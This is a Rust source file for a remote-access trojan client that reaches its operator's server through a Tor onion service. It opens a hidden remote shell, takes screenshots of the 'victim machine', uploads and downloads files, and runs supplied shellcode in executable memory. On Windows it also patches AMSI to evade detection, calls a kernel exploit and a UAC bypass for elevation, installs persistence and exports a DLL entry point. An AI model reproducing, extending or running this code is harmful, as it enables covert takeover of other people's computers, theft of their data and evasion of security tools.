#[cfg(target_os = "windows")]
mod uac_bypass;
#[cfg(target_os = "windows")]
mod amsi_patch;
#[cfg(target_os = "windows")]
mod kernel_exploit;
#[cfg(target_os = "windows")]
mod persist;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;


use arti_client::{TorClient, DataStream};
use arti_client::config::TorClientConfigBuilder;
use std::sync::Mutex;
use tempfile::TempDir;

static STATE_DIR: Mutex<Option<TempDir>> = Mutex::new(None);
static CACHE_DIR: Mutex<Option<TempDir>> = Mutex::new(None);

fn cleanup_temp_dirs() {
    if let Ok(mut guard) = STATE_DIR.lock() {
        guard.take();
    }
    if let Ok(mut guard) = CACHE_DIR.lock() {
        guard.take();
    }
}
#[cfg(target_os = "windows")]
use libc::malloc;
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use anyhow::{Result, Context, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
#[cfg(target_os = "windows")]
use zstd::zstd_safe::OutBuffer;
use std::fs;
use std::path::{Path};
use base64::{engine::general_purpose, Engine as _};
use libc::{c_int};

#[cfg(not(target_os = "android"))]
use screenshots::{Screen};
#[cfg(not(target_os = "android"))]
use screenshots::image::ImageOutputFormat;





#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
use winapi::um::memoryapi::VirtualAlloc;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::CreateThread;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::CloseHandle;
#[cfg(target_os = "windows")]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn get_onion_host() -> String {
    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
}


#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}


impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: get_onion_host(),
            port: 1337,
        }
    }
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let mut state_guard = STATE_DIR.lock().unwrap();
    let mut cache_guard = CACHE_DIR.lock().unwrap();
    let state = state_guard.get_or_insert_with(|| TempDir::new().expect("create temp state dir"));
    let cache = cache_guard.get_or_insert_with(|| TempDir::new().expect("create temp cache dir"));
    let config = TorClientConfigBuilder::from_directories(state.path(), cache.path())
        .build()?;
    let client = TorClient::create_bootstrapped(config).await?;
    println!("Initialized Tor Client");
    Ok(client)
}

#[cfg(not(target_os = "android"))]
fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    // Capture screenshot
    let image = screen.capture()?;

    // Encode PNG into memory
    let mut png_bytes: Vec<u8> = Vec::new();

    image.write_to(
        &mut std::io::Cursor::new(&mut png_bytes),
        ImageOutputFormat::Png,
    )?;

    // Convert PNG bytes -> base64
    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(format!("{}",b64))
}


/// Build prompt string
pub fn build_prompt() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());

    let host = gethostname()
        .into_string()
        .unwrap_or_else(|_| "host".into());

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!("{}@{} [{}] >> ", user, host, cwd)
}

#[cfg(target_os = "windows")]
fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
    unsafe {
        let ptr = VirtualAlloc(
            std::ptr::null_mut(),
            data.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if ptr.is_null() {
            return Err(anyhow!("VirtualAlloc failed"));
        }
        std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());

        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(ptr)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        if thread.is_null() {
            return Err(anyhow!("CreateThread failed"));
        }
        CloseHandle(thread);
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn execute_shellcode_unix(data: &[u8]) -> Result<()> {
    let data = data.to_vec();
    std::thread::spawn(move || {
        unsafe {
            let pagesize = libc::sysconf(libc::_SC_PAGESIZE) as usize;
            let aligned_size = (data.len() + pagesize - 1) & !(pagesize - 1);

            let ptr = libc::mmap(
                std::ptr::null_mut(),
                aligned_size,
                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );

            if ptr == libc::MAP_FAILED {
                return;
            }

            std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());

            let func: extern "C" fn() = std::mem::transmute(ptr);
            func();

            libc::munmap(ptr, aligned_size);
        }
    });
    Ok(())
}

/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        "help" | "/h"|"/?" |"" => {
            Ok(format!("

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `shellcode [file]`=>\tExecute shellcode from file
    `uac [exe_path]`=>\tRun elevated command on Windows

    ").into_bytes())
        }
        "screenshot" => {
            #[cfg(target_os = "android")]
            let encoded = {
                let output = std::process::Command::new("screencap")
                    .arg("-p")
                    .output()
                    .context("Failed to run screencap")?;
                general_purpose::STANDARD.encode(&output.stdout)
            };
            #[cfg(not(target_os = "android"))]
            let encoded = take_screenshot_base64()?;

            let filename = args.get(0).filter(|s| !s.is_empty()).cloned().unwrap_or("screenshot.png");
            Ok(format!("[file] {} {}", filename, encoded).into_bytes())
        }
        "upload" => {
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("upload: missing filename"))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!("invalid filename"))?;
            let encoded = general_purpose::STANDARD.encode(&data);

            let mut output = format!("[file-start] {}\n", filename);
            for chunk in encoded.as_bytes().chunks(16384) {
                let chunk_str = std::str::from_utf8(chunk).unwrap();
                output.push_str("[file-chunk] ");
                output.push_str(chunk_str);
                output.push('\n');
            }
            output.push_str(&format!("[file-end] {}\n", filename));
            Ok(output.into_bytes())
        }
        "download" | "[file][" => {
            
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("download: missing filename"))?;

            let encoded = args
                .get(1)
                .ok_or_else(|| anyhow!("download: missing data"))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("Wrote data to {}", input_filename).into_bytes())
        }
        "cd" => {
            let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
                }
                Err(e) => {
                    Ok(format!("cd error: {}\n", e).into_bytes())
                }
            }
        }
        "uac" => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac: missing argument\n".to_vec());
                }

                let payload = args.join(" ");
                crate::uac_bypass::elevate_uac(&payload);

                Ok(format!("Triggered UAC with payload: {}\n", payload).into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac not supported on this OS\n".to_vec())
            }
        }

        "shellcode" => {
            let b64_data = args
                .get(0)
                .ok_or_else(|| anyhow!("shellcode: missing base64 data"))?;

            let data = general_purpose::STANDARD.decode(b64_data)?;

            let msg = format!("Executing shellcode ({} bytes)\n", data.len());

            #[cfg(target_os = "windows")]
            execute_shellcode_windows(&data)?;

            #[cfg(not(target_os = "windows"))]
            execute_shellcode_unix(&data)?;

            Ok(msg.into_bytes())
        }

        "exit" | "quit" | "/quit" => {
            Ok("Goodbye\n".into())
        }

        _ => {
            #[cfg(target_os = "windows")]
            let mut command = {
                let mut c = Command::new("cmd.exe");
                c.arg("/C")
                    .arg(input)
                    .creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(target_os = "linux")]
            let mut command = {
                let mut c = Command::new("/bin/sh");
                c.arg("-c").arg(input);
                c
            };
            #[cfg(target_os = "macos")]
            let mut command = {
                let mut c = Command::new("/bin/sh");
                c.arg("-c").arg(input);
                c
            };
            #[cfg(target_os = "android")]
            let mut command = {
                let mut c = Command::new("/system/bin/sh");
                c.arg("-c").arg(input);
                c
            };



            let output = command.output().await?;

            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(b"(no output)\n");
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        }
    }
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop, returns Ok(true) on exit, Ok(false) on disconnect
pub async fn read_loop(stream: DataStream) -> Result<bool> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 16384];
    let mut buffer = String::new();
    let mut dl_filename: Option<String> = None;
    let mut dl_data: String = String::new();

    writer.write_all(build_prompt().as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("Connection closed by remote");
            return Ok(false);
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.starts_with("download-start ") {
                let parts: Vec<&str> = line.splitn(2, ' ').collect();
                dl_filename = Some(parts.get(1).unwrap_or(&"unknown").to_string());
                dl_data.clear();
                continue;
            }

            if dl_filename.is_some() {
                if line.starts_with("download-chunk ") {
                    let parts: Vec<&str> = line.splitn(2, ' ').collect();
                    if let Some(chunk) = parts.get(1) {
                        dl_data.push_str(chunk);
                    }
                    continue;
                }
                if line == "download-end" {
                    let fname = dl_filename.take().unwrap();
                    let raw = general_purpose::STANDARD.decode(&dl_data)?;
                    fs::write(&fname, &raw)?;
                    let msg = format!("Wrote data to {}\n", fname);
                    writer.write_all(msg.as_bytes()).await?;
                    writer.write_all(build_prompt().as_bytes()).await?;
                    writer.flush().await?;
                    continue;
                }
                dl_filename = None;
                dl_data.clear();
            }

            if line.is_empty() {
                writer.write_all(build_prompt().as_bytes()).await?;
                writer.flush().await?;
                continue;
            }

            if line == "exit" || line == "quit" || line == "/quit" {
                writer.write_all(b"Goodbye\n").await?;
                writer.flush().await?;
                return Ok(true);
            }

            match run_command(&line).await {
              Ok(output) => {
              writer.write_all(&output).await?;
              }
              Err(e) => {
                let err_msg = format!("ERROR: {}\n", e);
                writer.write_all(err_msg.as_bytes()).await?;
    }
}

writer.write_all(build_prompt().as_bytes()).await?;
writer.flush().await?;
        }
    }
}

/// Core runner
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("Attempting to connect...");

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("Connected to onion service");

                match read_loop(stream).await {
                    Ok(true) => {
                        println!("Exit requested");
                        break;
                    }
                    Ok(false) => {
                        println!("Connection closed");
                    }
                    Err(e) => {
                        println!("Session error: {}", e);
                    }
                }
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
        let delay = 17;
        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
    Ok(())
}

#[cfg(target_os = "windows")]
const IS_DLL:bool = true;

async fn netclient_impl() -> c_int {
    #[cfg(target_os = "windows")]
    amsi_patch::amsi_patch();

    #[cfg(target_os = "windows")]
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return 1,
    };

    #[cfg(target_os = "windows")]
    let exe_str = exe_path.to_string_lossy().to_string();

    #[cfg(target_os = "windows")]
    if !is_elevated() {
        unsafe {
            kernel_exploit::exploit();
        }
        uac_bypass::elevate_uac(&exe_str);
        return 1;
    }
    #[cfg(target_os = "windows")]
    persist::persist(IS_DLL);
    #[cfg(target_os = "windows")]
    if !is_elevated(){
        sleep(Duration::from_secs(61)).await;
    }
    let _ = netclient_run(ClientConfig::default()).await;
    cleanup_temp_dirs();
    return 0;
}

pub async fn netclient() -> c_int {
    netclient_impl().await
}

#[unsafe(export_name = "NetClientMain")]
pub extern "C" fn NetClientMain() -> c_int {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(netclient_impl())
}
